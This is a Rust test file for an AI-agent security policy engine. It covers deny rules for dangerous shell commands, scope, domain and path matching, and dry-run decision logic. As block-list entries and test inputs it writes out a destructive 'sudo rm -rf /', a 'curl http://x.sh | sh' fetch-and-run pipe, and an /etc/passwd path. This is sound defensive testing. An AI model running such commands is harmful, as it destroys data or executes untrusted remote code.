//! 由 `policy.rs` 拆分：`policy` 等 9 个函数（纯搬移，逻辑不变）。

use crate::enums::{InterceptPoint, PolicyAction};
use crate::ids::{Id, TenantId};
use crate::time::Timestamp;

use super::*;

pub(crate) fn policy() -> Policy {
    let now = Timestamp::now();
    Policy {
        id: Id::new(),
        tenant_id: TenantId::default_tenant(),
        name: "block-dangerous-commands".into(),
        description: "阻断危险 shell 命令".into(),
        language: PolicyLanguage::Structured,
        source: String::new(),
        structured: StructuredCondition {
            command_deny: vec!["rm -rf".into(), "re:curl\\s+[^|]+\\|\\s*(ba)?sh".into()],
            ..StructuredCondition::default()
        },
        action: PolicyAction::Deny,
        priority: 10,
        intercept_points: vec![InterceptPoint::McpProxy, InterceptPoint::AiGateway],
        scope_agent_ids: vec![],
        scope_departments: vec![],
        enabled: true,
        dry_run: false,
        quota_id: None,
        degrade_endpoint_id: None,
        content_hash: String::new(),
        signature: String::new(),
        version: 1,
        created_at: now,
        updated_at: now,
        deleted_at: None,
    }
}

#[test]
pub(crate) fn policy_hash_is_stable_and_sensitive() {
    let p = policy();
    assert_eq!(p.compute_hash(), p.compute_hash());
    let mut q = policy();
    q.version = 2;
    assert_ne!(p.compute_hash(), q.compute_hash());
}

#[test]
pub(crate) fn scope_matching() {
    let mut p = policy();
    assert!(p.applies_to(None, None), "未限定作用域即全租户生效");
    let agent = Id::new();
    p.scope_agent_ids = vec![agent];
    assert!(!p.applies_to(None, None));
    assert!(p.applies_to(Some(&agent), None));
    assert!(!p.applies_to(Some(&Id::new()), None));
    p.scope_agent_ids.clear();
    p.scope_departments = vec!["研发".into()];
    assert!(p.applies_to(None, Some("研发")));
    assert!(!p.applies_to(None, Some("市场")));
    p.enabled = false;
    assert!(!p.applies_to(None, Some("研发")));
}

#[test]
pub(crate) fn domain_matching_variants() {
    assert!(domain_matches("*", "anything.com"));
    assert!(domain_matches("api.openai.com", "API.OpenAI.com"));
    assert!(domain_matches("*.openai.com", "api.openai.com"));
    assert!(domain_matches("*.openai.com", "openai.com"));
    assert!(!domain_matches("*.openai.com", "notopenai.com"));
    assert!(!domain_matches("*.openai.com", "openai.com.evil.net"));
    assert!(domain_matches(".example.com", "a.example.com"));
}

#[test]
pub(crate) fn path_prefix_matching_normalizes_separators() {
    assert!(path_matches_prefix("C:\\Users\\alice", r"c:\users\alice\docs\a.txt"));
    assert!(path_matches_prefix("/etc", "/etc/passwd"));
    assert!(!path_matches_prefix("/etc", "/etcetera/passwd"));
    assert!(path_matches_prefix("*", "anything"));
}

#[test]
pub(crate) fn command_deny_substring_and_regex() {
    assert_eq!(command_matches_deny("rm -rf", "sudo rm -rf /"), Ok(true));
    assert_eq!(command_matches_deny("rm -rf", "ls -la"), Ok(false));
    assert_eq!(command_matches_deny(r"re:curl\s+[^|]+\|\s*(ba)?sh", "curl http://x.sh | sh"), Ok(true));
    assert!(command_matches_deny("re:(", "x").is_err());
}

#[test]
pub(crate) fn decision_helpers() {
    let mut d = PolicyDecision::allow("no policy matched");
    assert!(!d.is_blocking());
    d.action = PolicyAction::Deny;
    assert!(d.is_blocking());
    d.dry_run = true;
    assert!(!d.is_blocking(), "dry-run 不实际拦截");
    d.action = PolicyAction::Redact;
    assert!(!d.needs_redaction(), "dry-run 不改写内容");
    d.dry_run = false;
    assert!(d.needs_redaction());
    d.action = PolicyAction::Approval;
    assert!(d.needs_approval());
    d.dry_run = true;
    assert!(!d.needs_approval(), "dry-run 不阻塞等待审批");
}

#[test]
pub(crate) fn language_parse_aliases() {
    assert_eq!(PolicyLanguage::parse("OPA"), Ok(PolicyLanguage::Rego));
    assert_eq!(PolicyLanguage::parse("form"), Ok(PolicyLanguage::Structured));
    assert!(PolicyLanguage::parse("lua").is_err());
}

#[test]
pub(crate) fn covers_all_points() {
    let p = policy();
    assert!(!p.covers_all_points());
    let mut q = policy();
    q.intercept_points = vec![InterceptPoint::McpProxy, InterceptPoint::AiGateway, InterceptPoint::ProcessHook];
    assert!(q.covers_all_points());
}
